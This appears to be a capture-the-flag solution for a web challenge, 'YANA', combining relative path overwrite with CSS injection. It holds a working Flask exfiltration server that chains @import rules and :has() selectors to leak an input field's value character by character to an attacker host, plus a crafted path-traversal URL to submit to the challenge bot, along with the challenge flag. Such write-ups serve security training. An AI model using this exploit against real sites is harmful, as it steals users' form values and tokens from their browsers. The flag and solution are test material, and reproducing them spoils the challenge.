# YANA

kiseki

---

## Flag

```
ARA5{c3rtif1ed_css_m4st3r}
```


## Idea
Relative Path Overwrite + CSS Injection

## Tags
css-injection, rpo

## Solver
Run this script on your server
```python
import string
from flask import Flask, Response, request
import time
import re
HOST = "<SERVER>"
leaked = ""
MAX_VALUE = 30
wordlist = string.ascii_letters + string.digits + "_{}"

def init_css():
    css = f'@import url({HOST}/next?{time.time()});'
    for c in wordlist:
        css += f"html:has(input[value^='{leaked+c}']){{--v{len(leaked)}:url({HOST}/leak?c={leaked+c});}}"
    css += 'html { background: ' + ','.join([f'var(--v{i},none)' for i in range(MAX_VALUE)]) + '}'
    return css

def generate_css():
    css = f'@import url({HOST}/next?{time.time()});'
    for c in wordlist:
        css += f"html:has(input[value^='{leaked+c}']){{--v{len(leaked)}:url({HOST}/leak?c={leaked+c});}}"
    return css

queue = 0

app = Flask(__name__)

@app.route('/style.css')
def stream():
    global queue
    queue += 1
    return Response(init_css(), mimetype='text/css')

@app.route('/leak')
def leak2():
    global leaked
    if len(leaked) < len(request.args.get('c')):
        leaked = request.args.get('c')
        global queue
        queue = 0
    return 'ok'

@app.route('/next')
def next():
    global queue
    while queue > 0:
        time.sleep(0.1)
    global leaked
    if re.findall(r'ARA5{.*}', leaked):
        return 'ok'
    time.sleep(2)
    return Response(generate_css(), mimetype='text/css')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

Submit this to bot
```
http://server:8080/**/@import'//<server>/style.css';/*/..%2f..%2f..%2f..%2f..%2findex.html
```
